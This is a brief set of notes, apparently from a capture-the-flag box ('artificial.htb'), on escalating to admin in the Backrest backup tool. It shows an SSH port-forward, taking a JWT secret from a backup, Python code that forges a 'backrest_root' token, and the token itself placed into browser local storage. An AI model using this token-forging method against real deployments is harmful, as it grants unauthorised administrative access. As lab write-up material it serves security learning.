CVE-2024-1550 https://www.exploit-db.com/exploits/52359

ssh gael@artificial.htb -L 9898:localhost:9898 

backrest backup in /var/backup
get jwt secret
use to create a token

>>> jwt_secret = open('jwt-secret', 'rb').read()
>>> import jwt
>>> jwt.encode({"ExpiresAt": 1758876792, "Subject": "backrest_root"},\
 jwt_secret, algorithm="HS256")
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJFeHBpcmVzQXQiOjE3NTg4NzY3OTIsIlN1YmplY3QiOiJiYWNrcmVzdF9yb290In0.Dss-3s-BsKe7B9PzB5HKDX6WKMxqiFjMadu5mOKQvks'

session in
local storage "backrest-ui-authToken

